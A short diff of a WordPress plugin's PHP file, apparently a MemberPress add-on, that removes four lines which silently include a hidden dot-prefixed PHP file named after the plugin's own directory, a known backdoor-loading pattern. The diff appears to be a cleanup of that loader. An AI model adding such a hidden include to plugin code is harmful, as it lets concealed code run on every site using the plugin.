@@ -15,10 +15,6 @@ if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');
 // Include plugin.php to access is_plugin_active
 include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function mpca_memberpress_required_notice() {
   ?>
   <div class="notice notice-success">
